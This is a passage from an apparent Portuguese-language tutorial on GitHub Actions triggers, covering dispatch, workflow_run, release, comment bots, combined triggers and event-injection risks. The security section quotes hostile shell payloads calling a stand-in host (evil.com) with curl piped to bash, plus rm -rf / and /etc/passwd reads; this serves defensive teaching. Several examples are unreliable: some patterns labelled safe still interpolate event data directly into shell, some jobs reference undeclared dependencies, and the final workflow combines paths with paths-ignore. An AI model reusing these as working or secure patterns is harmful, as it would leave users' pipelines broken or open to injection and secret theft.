   segundo. Pode haver atraso de ate 15 minutos
3. **Branch default**: Schedules sempre rodam na branch default
4. **Inactivity**: Repositorios sem atividade por 60 dias podem ter
   schedules desabilitados
5. **Concurrency**: Apenas um workflow pode rodar por vez para o
   mesmo repositorio

### Exemplo Completo: Build Noturno com Relatorio

```yaml
name: Nightly Build

on:
  schedule:
    - cron: '0 2 * * *'

  workflow_dispatch:

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    outputs:
      result: ${{ steps.test.outcome }}
      coverage: ${{ steps.coverage.outputs.pct }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci
      - run: npm run build

      - id: test
        run: npm test

      - id: coverage
        run: |
          npm run test:coverage
          PCT=$(cat coverage/coverage-summary.json | jq '.total.lines.pct')
          echo "pct=$PCT" >> "$GITHUB_OUTPUT"

  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run security scan
        run: |
          npm audit --production --json > audit-results.json
          VULNS=$(jq '.metadata.vulnerabilities.total' audit-results.json)
          echo "Vulnerabilities: $VULNS"
          if [ "$VULNS" -gt 0 ]; then
            exit 1
          fi

  dependency-update-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm outdated || true
      - run: pip list --outdated || true

  report:
    needs: [build-and-test, security-scan, dependency-update-check]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Generate report
        run: |
          echo "## Nightly Build Report" >> report.md
          echo "Date: $(date -u)" >> report.md
          echo "Build: ${{ needs.build-and-test.outputs.result }}" >> report.md
          echo "Coverage: ${{ needs.build-and-test.outputs.coverage }}%" >> report.md
          echo "Security: ${{ needs.security-scan.result }}" >> report.md

      - name: Upload report
        uses: actions/upload-artifact@v4
        with:
          name: nightly-report
          path: report.md
```

---

## 3.6 Repository Dispatch

O `repository_dispatch` e um trigger customizado que permite executar
workflows atraves de chamadas API. E ideal para integracao com sistemas
externos como pipelines de deploy, webhooks de terceiros, e ferramentas
de CI/CD externas.

### Sintaxe Completa

```yaml
on:
  repository_dispatch:
    types:
      - deploy
      - build
      - test
      - maintenance
      - alert
```

### Atributo `types`

O campo `types` e OPCIONAL. Se omitido, o workflow roda para QUALQUER
tipo de repository_dispatch:

```yaml
# Roda para qualquer tipo de dispatch
on:
  repository_dispatch:
```

```yaml
# Roda apenas para tipos especificos
on:
  repository_dispatch:
    types: [deploy, build]
```

### Triggerar via API REST

```bash
# Dispatch simples
curl -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/OWNER/REPO/dispatches \
  -d '{
    "event_type": "deploy",
    "client_payload": {
      "environment": "staging",
      "version": "1.2.3"
    }
  }'

# Dispatch com token de app
curl -X POST \
  -H "Authorization: Bearer $INSTALLATION_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/OWNER/REPO/dispatches \
  -d '{
    "event_type": "build",
    "client_payload": {
      "commit": "abc123",
      "branch": "main"
    }
  }'
```

### Triggerar via GitHub CLI

```bash
# Dispatch simples
gh api repos/OWNER/REPO/dispatches \
  -f event_type=deploy \
  -f client_payload[environment]=staging \
  -f client_payload[version]=1.2.3

# Dispatch com JSON
gh api repos/OWNER/REPO/dispatches \
  --input - <<'EOF'
{
  "event_type": "deploy",
  "client_payload": {
    "environment": "production",
    "version": "1.2.3",
    "triggered_by": "ci-pipeline"
  }
}
EOF
```

### Acessar Payload no Workflow

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Show payload
        run: |
          echo "Event type: ${{ github.event.client_payload.environment }}"
          echo "Version: ${{ github.event.client_payload.version }}"
          echo "Triggered by: ${{ github.event.client_payload.triggered_by }}"

      - name: Use payload
        run: |
          ENV="${{ github.event.client_payload.environment }}"
          VERSION="${{ github.event.client_payload.version }}"

          if [ "$ENV" == "production" ]; then
            echo "Deploying v$VERSION to production"
          else
            echo "Deploying v$VERSION to $ENV"
          fi
```

### Exemplo Completo: Pipeline Externo

```yaml
name: External Pipeline Deploy

on:
  repository_dispatch:
    types: [deploy, rollback, scale]

jobs:
  deploy:
    if: github.event.action == 'deploy'
    runs-on: ubuntu-latest
    environment: ${{ github.event.client_payload.environment }}
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        run: |
          echo "Deploying version ${{ github.event.client_payload.version }}"
          echo "to ${{ github.event.client_payload.environment }}"

  rollback:
    if: github.event.action == 'rollback'
    runs-on: ubuntu-latest
    steps:
      - name: Rollback
        run: |
          echo "Rolling back to ${{ github.event.client_payload.previous_version }}"

  scale:
    if: github.event.action == 'scale'
    runs-on: ubuntu-latest
    steps:
      - name: Scale
        run: |
          echo "Scaling to ${{ github.event.client_payload.replicas }} replicas"
```

### Seguranca para Repository Dispatch

- Valide o `client_payload` antes de usar em comandos
- Nunca execute comandos arbitrarios baseados no payload
- Use `repository_dispatch` com `types` para limitar tipos aceitos
- Implemente autenticacao robusta no sistema externo
- Registre todas as chamadas para auditoria

---

## 3.7 Workflow Run

O trigger `workflow_run` permite executar um workflow baseado no
resultado de outro workflow. E a forma principal de encadear workflows
no GitHub Actions.

### Sintaxe Completa

```yaml
on:
  workflow_run:
    workflows: ["Build", "Test"]
    types: [completed]
    branches:
      - main
      - 'release/**'
```

### Tipos de Eventos

| Type | Quando Dispara |
|---|---|
| completed | Workflow anterior terminou (sucesso ou falha) |
| requested | Workflow anterior foi requisitado |
| in_progress | Workflow anterior comecou a executar |

### Filtrar por Conclusion

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    steps:
      - run: echo "Deploying after successful build"

  notify-failure:
    runs-on: ubuntu-latest
    if: ${{ github.event.workflow_run.conclusion == 'failure' }}
    steps:
      - run: echo "Build failed, notifying team"
```

Valores possiveis para `conclusion`:
- `success`
- `failure`
- `cancelled`
- `skipped`
- `timed_out`

### Acessando Dados do Workflow Anterior

```yaml
jobs:
  post-process:
    runs-on: ubuntu-latest
    steps:
      - name: Previous workflow info
        run: |
          echo "Workflow: ${{ github.event.workflow_run.name }}"
          echo "Run ID: ${{ github.event.workflow_run.id }}"
          echo "Run Number: ${{ github.event.workflow_run.run_number }}"
          echo "Conclusion: ${{ github.event.workflow_run.conclusion }}"
          echo "Branch: ${{ github.event.workflow_run.head_branch }}"
          echo "SHA: ${{ github.event.workflow_run.head_sha }}"
          echo "Event: ${{ github.event.workflow_run.event }}"
          echo "Actor: ${{ github.event.workflow_run.actor.login }}"
          echo "Created: ${{ github.event.workflow_run.created_at }}"
          echo "Updated: ${{ github.event.workflow_run.updated_at }}"
```

### Baixando Artefatos do Workflow Anterior

```yaml
jobs:
  download-artifacts:
    runs-on: ubuntu-latest
    steps:
      - name: Download artifact from previous run
        uses: actions/github-script@v7
        with:
          script: |
            const artifacts = await github.rest.actions.listWorkflowRunArtifacts({
              owner: context.repo.owner,
              repo: context.repo.repo,
              run_id: context.payload.workflow_run.id
            });

            for (const artifact of artifacts.data.artifacts) {
              const download = await github.rest.actions.downloadArtifact({
                owner: context.repo.owner,
                repo: context.repo.repo,
                artifact_id: artifact.id,
                archive_format: 'zip'
              });

              const fs = require('fs');
              fs.writeFileSync(`${artifact.name}.zip`,
                Buffer.from(download.data));
            }

      - name: Unzip artifacts
        run: unzip *.zip
```

### Verificando Commits do Workflow Anterior

```yaml
jobs:
  check-commits:
    runs-on: ubuntu-latest
    steps:
      - name: List commits
        uses: actions/github-script@v7
        with:
          script: |
            const commits = context.payload.workflow_run.head_commit;
            console.log('Head commit:', commits.message);

            const compare = await github.rest.repos.compareCommits({
              owner: context.repo.owner,
              repo: context.repo.repo,
              base: context.payload.workflow_run.head_branch,
              head: context.payload.workflow_run.head_sha
            });

            for (const commit of compare.data.commits) {
              console.log(`${commit.sha.substring(0, 7)} - ${commit.commit.message}`);
            }
```

### Exemplo Completo: Pipeline Encadeada

```yaml
# Workflow A: Build
name: Build

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
```

```yaml
# Workflow B: Test (roda apos Build)
name: Test

on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]

jobs:
  test:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: build-output
          path: dist/
      - run: npm ci && npm test
```

```yaml
# Workflow C: Deploy (roda apos Test)
name: Deploy

on:
  workflow_run:
    workflows: ["Test"]
    types: [completed]

jobs:
  deploy:
    if: >
      github.event.workflow_run.conclusion == 'success' &&
      github.event.workflow_run.head_branch == 'main'
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: build-output
          path: dist/
      - run: echo "Deploying to production"
```

### Seguranca para Workflow Run

- O `workflow_run` herda o contexto do repositorio base, nao do fork
- Cuidado ao usar artefatos de workflows de forks
- Valide a conclusao antes de executar acoes perigosas
- Use `github.event.workflow_run.event` para distinguir push de PR
- Implemente logging para auditoria de encadeamentos

---

## 3.8 Release Trigger

O trigger `release` e usado para executar workflows quando um GitHub
Release e criado, editado, ou publicado. E ideal para publicar pacotes,
notificar usuarios, e gerar artefatos de distribuicao.

### Tipos de Eventos

```yaml
on:
  release:
    types:
      - published
      - created
      - edited
      - deleted
      - prereleased
      - released
      - unpublished
```

| Type | Quando Dispara |
|---|---|
| published | Release publicado (inclui prereleases) |
| created | Release criado (pode ser draft) |
| edited | Titulo, descricao, ou assets editados |
| deleted | Release deletado |
| prereleased | Pre-release marcado |
| released | Pre-release convertido para release completo |
| unpublished | Release despublicado |

### Propriedades do Contexto

```yaml
steps:
  - name: Release info
    run: |
      echo "Tag: ${{ github.event.release.tag_name }}"
      echo "Name: ${{ github.event.release.name }}"
      echo "Body: ${{ github.event.release.body }}"
      echo "Draft: ${{ github.event.release.draft }}"
      echo "Prerelease: ${{ github.event.release.prerelease }}"
      echo "Author: ${{ github.event.release.author.login }}"
      echo "URL: ${{ github.event.release.html_url }}"
      echo "Assets: ${{ github.event.release.assets }}"
```

### Exemplo Completo: Publish e Notificacao

```yaml
name: Release Pipeline

on:
  release:
    types: [published]

jobs:
  publish-npm:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          registry-url: 'https://registry.npmjs.org'
      - run: npm ci
      - run: npm publish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

  publish-docker:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build Docker image
        run: |
          docker build -t myapp:${{ github.event.release.tag_name }} .
          docker tag myapp:${{ github.event.release.tag_name }} \
            ghcr.io/myorg/myapp:${{ github.event.release.tag_name }}
      - name: Push to registry
        run: |
          echo ${{ secrets.GITHUB_TOKEN }} | docker login ghcr.io -u $GITHUB_ACTOR --password-stdin
          docker push ghcr.io/myorg/myapp:${{ github.event.release.tag_name }}

  generate-changelog:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Generate changelog
        run: |
          git log $(git describe --tags --abbrev=0)..HEAD --oneline > CHANGELOG.md
      - name: Upload changelog
        uses: actions/upload-artifact@v4
        with:
          name: changelog
          path: CHANGELOG.md

  notify:
    needs: [publish-npm, publish-docker]
    runs-on: ubuntu-latest
    steps:
      - name: Send notification
        run: |
          echo "Release ${{ github.event.release.tag_name }} published!"
          echo "NPM: ${{ needs.publish-npm.result }}"
          echo "Docker: ${{ needs.publish-docker.result }}"
```

### Filtrando por Tag

```yaml
on:
  release:
    types: [published]

# Filtrar no job
jobs:
  major-release:
    if: startsWith(github.event.release.tag_name, 'v')
    runs-on: ubuntu-latest
    steps:
      - run: echo "Major release detected"
```

### Exemplo: Pre-release vs Release

```yaml
on:
  release:
    types: [published]

jobs:
  full-release:
    if: '!github.event.release.prerelease'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Full release - deploy to production"

  pre-release:
    if: github.event.release.prerelease
    runs-on: ubuntu-latest
    steps:
      - run: echo "Pre-release - deploy to staging"
```

---

## 3.9 Issue Comment

O trigger `issue_comment` dispara quando um comentario e adicionado,
editado, ou deletado em uma issue OU pull request. E amplamente usado
para bots de deploy, moderacao, e automacao baseada em comandos.

### Sintaxe Completa

```yaml
on:
  issue_comment:
    types:
      - created
      - edited
      - deleted
```

### Importante: Issues vs Pull Requests

O evento `issue_comment` e disparado para AMBOS, issues e pull requests.
Para distinguir:

```yaml
jobs:
  handle-comment:
    runs-on: ubuntu-latest
    steps:
      - name: Check if PR or Issue
        run: |
          if [[ "${{ github.event.issue.pull_request }}" != "" ]]; then
            echo "Comment is on a Pull Request"
            echo "PR Number: ${{ github.event.issue.number }}"
          else
            echo "Comment is on an Issue"
            echo "Issue Number: ${{ github.event.issue.number }}"
          fi
```

### Bot de Deploy por Comentario

```yaml
name: Deploy Bot

on:
  issue_comment:
    types: [created]

jobs:
  deploy:
    if: >
      github.event.issue.pull_request &&
      contains(github.event.comment.body, '/deploy') &&
      (github.event.comment.author_association == 'MEMBER' ||
       github.event.comment.author_association == 'OWNER' ||
       github.event.comment.author_association == 'COLLABORATOR')
    runs-on: ubuntu-latest
    steps:
      - name: React to comment
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.reactions.createForIssueComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              comment_id: context.payload.comment.id,
              content: 'rocket'
            });

      - name: Parse deploy command
        id: parse
        run: |
          COMMENT="${{ github.event.comment.body }}"
          ENV=$(echo "$COMMENT" | grep -oP '/deploy\s+\K\S+' || echo "staging")
          echo "environment=$ENV" >> "$GITHUB_OUTPUT"

      - uses: actions/checkout@v4
      - name: Deploy
        run: echo "Deploying to ${{ steps.parse.outputs.environment }}"
```

### Bot de Review por Comentario

```yaml
name: Review Bot

on:
  issue_comment:
    types: [created]

jobs:
  auto-review:
    if: >
      github.event.issue.pull_request &&
      github.event.comment.body == '/review'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run review checks
        run: |
          echo "Running automated review..."
          echo "PR: ${{ github.event.issue.number }}"
          echo "Author: ${{ github.event.issue.user.login }}"

      - name: Post review comment
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: 'Automated review completed. All checks passed.'
            });
```

### Seguranca para Issue Comment

1. **author_association**: Verifique se o comentario veio de um
   membro autorizado antes de executar acoes perigosas

```yaml
if: >
  github.event.comment.author_association == 'OWNER' ||
  github.event.comment.author_association == 'MEMBER' ||
  github.event.comment.author_association == 'COLLABORATOR'
```

2. **Validacao de comando**: Nunca execute comandos diretamente do
   corpo do comentario

```yaml
# PERIGOSO
- run: ${{ github.event.comment.body }}

# SEGURO
- run: |
    if [[ "${{ github.event.comment.body }}" == "/deploy staging" ]]; then
      echo "Deploy to staging"
    fi
```

3. **Secrets**: `issue_comment` NAO tem acesso a secrets por padrao
   em forks. Use `pull_request_target` para workflows que precisam
   de secrets em PRs de forks.

4. **Rate limiting**: Implemente rate limiting para evitar spam de
   comentarios que triggeram workflows.

---

## 3.10 Discussion Comment

O trigger `discussion_comment` e similar ao `issue_comment`, mas
especifico para GitHub Discussions. E util para bots de moderacao,
pesquisas, e automacao baseada em comandos em discussions.

### Sintaxe Completa

```yaml
on:
  discussion_comment:
    types:
      - created
      - edited
      - deleted
```

### Propriedades do Contexto

```yaml
steps:
  - name: Discussion info
    run: |
      echo "Discussion: ${{ github.event.discussion.title }}"
      echo "Category: ${{ github.event.discussion.category.name }}"
      echo "Author: ${{ github.event.discussion.author.login }}"
      echo "Comment: ${{ github.event.comment.body }}"
      echo "Comment Author: ${{ github.event.comment.author.login }}"
```

### Bot de Moderacao

```yaml
name: Discussion Moderator

on:
  discussion_comment:
    types: [created]

jobs:
  moderate:
    if: >
      contains(github.event.comment.body, '/pin')
    runs-on: ubuntu-latest
    steps:
      - name: Pin discussion
        uses: actions/github-script@v7
        with:
          script: |
            await github.graphql(`
              mutation {
                pinDiscussionComment(input: {
                  discussionId: "${{ github.event.discussion.node_id }}",
                  commentId: "${{ github.event.comment.node_id }}"
                }) {
                  discussion { id }
                }
              }
            `);
```

### Bot de FAQ

```yaml
name: FAQ Bot

on:
  discussion_comment:
    types: [created]

jobs:
  faq:
    if: contains(github.event.comment.body, '/faq')
    runs-on: ubuntu-latest
    steps:
      - name: Get FAQ
        uses: actions/github-script@v7
        with:
          script: |
            const faq = `
            ## FAQ

            **Q: Como instalar?**
            A: Execute \`npm install\`

            **Q: Como rodar testes?**
            A: Execute \`npm test\`
            `;

            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: faq
            });
```

### Seguranca para Discussion Comment

- Use `author_association` para validar permissoes
- Implemente rate limiting para evitar spam
- Valide comandos antes de executar
- Nao execute codigo arbitrario baseado no corpo do comentario
- Use `discussion.category.name` para filtrar por categoria

---

## 3.11 Combining Triggers

O GitHub Actions permite combinar multiplos triggers em um unico
workflow. Isso e essencial para criar pipelines flexiveis que respondem
a diferentes eventos.

### Padrao OR (Qualquer Um)

Quando voce especifica multiplos triggers, eles funcionam como OR:
o workflow roda se QUALQUER um dos triggers for ativado.

```yaml
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 2 * * *'
  workflow_dispatch:
```

Neste caso, o workflow roda quando:
- Alguem faz push para main, OU
- Um PR e aberto/sincronizado para main, OU
- O cron atinge 2h UTC, OU
- Alguem triggera manualmente

### Padrao AND (Todos)

Dentro de UM trigger, os filtros funcionam como AND:

```yaml
on:
  push:
    branches: [main, develop]
    paths: ['src/**', 'tests/**']
```

O workflow so roda quando:
- O push e para main OU develop (branches = OR), E
- Arquivos em src/ OU tests/ foram alterados (paths = OR)

### Combinando OR e AND

```yaml
on:
  push:
    branches: [main]
    paths: ['src/**']          # push to main AND changes in src/
  pull_request:
    branches: [main]
    paths: ['src/**']          # PR to main AND changes in src/
  schedule:
    - cron: '0 2 * * *'        # Every day at 2am UTC
  workflow_dispatch:            # Manual trigger
```

### workflow_dispatch + push

```yaml
on:
  workflow_dispatch:
    inputs:
      force_deploy:
        type: boolean
        default: false
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building..."

  deploy:
    needs: build
    if: >
      github.event_name == 'push' ||
      (github.event_name == 'workflow_dispatch' && inputs.force_deploy)
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."
```

### workflow_run + push

```yaml
on:
  push:
    branches: [main]
  workflow_run:
    workflows: ["Security Scan"]
    types: [completed]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building..."

  deploy:
    needs: build
    if: >
      (github.event_name == 'push') ||
      (github.event_name == 'workflow_run' &&
       github.event.workflow_run.conclusion == 'success')
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."
```

### Condicoes Complexas com Multiplos Triggers

```yaml
name: Complex Multi-Trigger Pipeline

on:
  push:
    branches: [main, develop]
    paths:
      - 'src/**'
      - 'package.json'
  pull_request:
    branches: [main]
    types: [opened, synchronize]
    paths:
      - 'src/**'
  schedule:
    - cron: '0 2 * * 1-5'
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
      force:
        type: boolean
        default: false

jobs:
  determine-context:
    runs-on: ubuntu-latest
    outputs:
      is_release: ${{ steps.ctx.outputs.is_release }}
      is_pr: ${{ steps.ctx.outputs.is_pr }}
      is_scheduled: ${{ steps.ctx.outputs.is_scheduled }}
      is_manual: ${{ steps.ctx.outputs.is_manual }}
    steps:
      - id: ctx
        run: |
          echo "is_release=${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}" >> "$GITHUB_OUTPUT"
          echo "is_pr=${{ github.event_name == 'pull_request' }}" >> "$GITHUB_OUTPUT"
          echo "is_scheduled=${{ github.event_name == 'schedule' }}" >> "$GITHUB_OUTPUT"
          echo "is_manual=${{ github.event_name == 'workflow_dispatch' }}" >> "$GITHUB_OUTPUT"

  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build
          path: dist/

  test:
    needs: build
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [18, 20, 22]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci && npm test

  security:
    needs: build
    runs-on: ubuntu-latest
    if: >
      needs.determine-context.outputs.is_release == 'true' ||
      needs.determine-context.outputs.is_scheduled == 'true'
    steps:
      - run: echo "Running security scan"

  deploy-staging:
    needs: [build, test]
    if: >
      needs.determine-context.outputs.is_pr == 'true' ||
      (needs.determine-context.outputs.is_manual == 'true' &&
       inputs.environment == 'staging')
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - run: echo "Deploying to staging"

  deploy-production:
    needs: [build, test, security]
    if: >
      needs.determine-context.outputs.is_release == 'true' ||
      (needs.determine-context.outputs.is_manual == 'true' &&
       inputs.environment == 'production' && inputs.force == true)
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - run: echo "Deploying to production"
```

### Padroes Avancados de Combinacao

**Merge queue trigger**:

```yaml
on:
  push:
    branches: [main]

# Combinado com merge queue do GitHub
# O workflow roda para cada commit na fila de merge
```

**Dependabot + CI**:

```yaml
on:
  push:
    branches: [main, 'dependabot/**']
  pull_request:
    branches: [main]

jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
      - name: Auto-approve dependabot
        if: startsWith(github.head_ref, 'dependabot/')
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.pulls.createReview({
              owner: context.repo.owner,
              repo: context.repo.repo,
              pull_number: context.issue.number,
              event: 'APPROVE'
            });
```

---

## 3.12 Seguranca: Event Injection

Event injection e uma das vulnerabilidades mais criticas do GitHub
Actions. Acontece quando dados de eventos (como titulos de PR, nomes
de branches, ou corpos de comentarios) sao injetados diretamente em
comandos `run`, permitindo que atacantes executem codigo arbitrario.

### Como Funciona o Ataque

```yaml
# VULNERAVEL: event injection
name: Vulnerable Workflow

on:
  pull_request:

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Process PR
        run: |
          echo "PR title: ${{ github.event.pull_request.title }}"
          # SE o titulo do PR for:
          #   Test PR"; curl http://evil.com/shell.sh | bash; echo "
          # O atacante executa codigo arbitrario!
```

O atacante cria um PR com titulo malicioso que contiene comandos shell.
Quando o workflow roda, o `${{ github.event.pull_request.title }}` e
expandido ANTES da execucao do shell, injetando os comandos.

### Vetores de Ataque Comuns

| Campo | Exemplo de Payload |
|---|---|
| PR title | `"; curl evil.com/x \| bash; echo "` |
| PR body | Sequencia de comandos markdown que e executada |
| Branch name | `main"; rm -rf /; echo "` |
| Issue title | `"; cat /etc/passwd; echo "` |
| Issue body | Comandos shell em formato markdown |
| Comment body | Comandos shell em comentarios |
| Commit message | `"; echo secrets > evil.txt; echo "` |
| Tag name | `v1.0"; curl evil.com/shell.sh | bash; echo "` |

### Prevencoes

**1. Usar variaveis de ambiente (SEGURO)**:

```yaml
steps:
  # SEGURO: dados vao para variavel de ambiente, nao sao executados
  - env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: echo "PR title: $PR_TITLE"
```

**2. Validar dados antes de usar**:

```yaml
steps:
  - name: Validate and use
    run: |
      TITLE="${{ github.event.pull_request.title }}"
      # Validar que o titulo nao contem caracteres perigosos
      if [[ "$TITLE" =~ [\;\|\&\`\$] ]]; then
        echo "ERROR: Invalid characters in PR title"
        exit 1
      fi
      echo "PR title: $TITLE"
```

**3. Usar actions/github-script**:

```yaml
steps:
  # SEGURO: github-script nao executa shell
  - uses: actions/github-script@v7
    with:
      script: |
        const title = context.payload.pull_request.title;
        console.log('PR title:', title);
```

**4. Usar contexts em vez de interpolar diretamente**:

```yaml
steps:
  # PERIGOSO
  - run: echo "${{ github.event.issue.title }}"

  # SEGURO
  - run: echo "$ISSUE_TITLE"
    env:
      ISSUE_TITLE: ${{ github.event.issue.title }}
```

### pull_request_target: O Risco Mais Subestimado

```yaml
# EXTREMAMENTE PERIGOSO
on:
  pull_request_target:
    types: [opened]

jobs:
  dangerous:
    runs-on: ubuntu-latest
    steps:
      # Checkout do PR head = codigo do fork e executado
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test  # Codigo malicioso pode estar aqui!
```

Um atacante pode:
1. Forkar seu repositorio
2. Adicionar codigo malicioso que so executa no contexto do fork
3. Abrir um PR para seu repositorio
4. O workflow `pull_request_target` roda com seus secrets
5. O codigo malicioso executa e envia seus secrets para o atacante

**Como se proteger**:

```yaml
# SEGURO: pull_request_target SEM checkout do PR head
on:
  pull_request_target:
    types: [opened]

jobs:
  safe:
    runs-on: ubuntu-latest
    steps:
      # Checkout do BASE branch (seu codigo, nao o do fork)
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.base.ref }}
      - run: npm ci && npm test
```

### Checklist de Seguranca

- [ ] Nunca usar `github.event.*` diretamente em comandos `run`
- [ ] Sempre usar variaveis de ambiente para dados de eventos
- [ ] Validar dados antes de usar em comandos
- [ ] Nao fazer checkout de PR head em workflows `pull_request_target`
- [ ] Usar `author_association` para validar permissoes
- [ ] Implementar rate limiting para eventos de comentario
- [ ] Revisar todos os usos de `run:` com dados de eventos
- [ ] Usar `actions/github-script` quando possivel
- [ ] Implementar branch protection rules
- [ ] Usar environments com protection rules para deploys

---

## 3.13 Exemplo Completo com Multiplos Triggers e Jobs

Este e um exemplo abrangente de um pipeline CI/CD que utiliza
multiplos triggers e jobs com logicas complexas.

```yaml
name: Production CI/CD Pipeline

on:
  push:
    branches:
      - main
      - 'release/**'
    paths:
      - 'src/**'
      - 'tests/**'
      - 'package.json'
      - 'tsconfig.json'
      - '.github/workflows/ci-cd.yml'
    paths-ignore:
      - 'docs/**'
      - '*.md'

  pull_request:
    branches:
      - main
    types: [opened, synchronize, reopened, ready_for_review]
    paths:
      - 'src/**'
      - 'tests/**'

  schedule:
    - cron: '0 2 * * 1-5'

  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options:
          - staging
          - production
      version:
        description: 'Version to deploy'
        required: false
        type: string
        default: 'latest'
      skip_tests:
        description: 'Skip test suite'
        required: false
        type: boolean
        default: false

  repository_dispatch:
    types: [deploy, hotfix]

permissions:
  contents: read
  packages: write
  issues: write
  pull-requests: write

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  # ============================================================
  # JOB: Determine Context
  # ============================================================
  context:
    runs-on: ubuntu-latest
    outputs:
      is_release: ${{ steps.ctx.outputs.is_release }}
      is_pr: ${{ steps.ctx.outputs.is_pr }}
      is_scheduled: ${{ steps.ctx.outputs.is_scheduled }}
      is_manual: ${{ steps.ctx.outputs.is_manual }}
      is_dispatch: ${{ steps.ctx.outputs.is_dispatch }}
      should_deploy: ${{ steps.ctx.outputs.should_deploy }}
    steps:
      - id: ctx
        run: |
          IS_RELEASE="${{ github.event_name == 'push' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/heads/release/')) }}"
          IS_PR="${{ github.event_name == 'pull_request' }}"
          IS_SCHEDULED="${{ github.event_name == 'schedule' }}"
          IS_MANUAL="${{ github.event_name == 'workflow_dispatch' }}"
          IS_DISPATCH="${{ github.event_name == 'repository_dispatch' }}"

          SHOULD_DEPLOY="false"
          if [[ "$IS_RELEASE" == "true" || "$IS_MANUAL" == "true" || "$IS_DISPATCH" == "true" ]]; then
            SHOULD_DEPLOY="true"
          fi

          echo "is_release=$IS_RELEASE" >> "$GITHUB_OUTPUT"
          echo "is_pr=$IS_PR" >> "$GITHUB_OUTPUT"
          echo "is_scheduled=$IS_SCHEDULED" >> "$GITHUB_OUTPUT"
          echo "is_manual=$IS_MANUAL" >> "$GITHUB_OUTPUT"
          echo "is_dispatch=$IS_DISPATCH" >> "$GITHUB_OUTPUT"
          echo "should_deploy=$SHOULD_DEPLOY" >> "$GITHUB_OUTPUT"

  # ============================================================
  # JOB: Lint & Format
  # ============================================================
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm run format:check

  # ============================================================
  # JOB: Type Check
  # ============================================================
  typecheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run typecheck

  # ============================================================
  # JOB: Unit Tests (Matrix)
  # ============================================================
  test-unit:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        node-version: [18, 20, 22]
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      - run: npm ci
      - name: Run tests (shard ${{ matrix.shard }}/4)
        run: npm run test:unit -- --shard=${{ matrix.shard }}/4
      - uses: actions/upload-artifact@v4
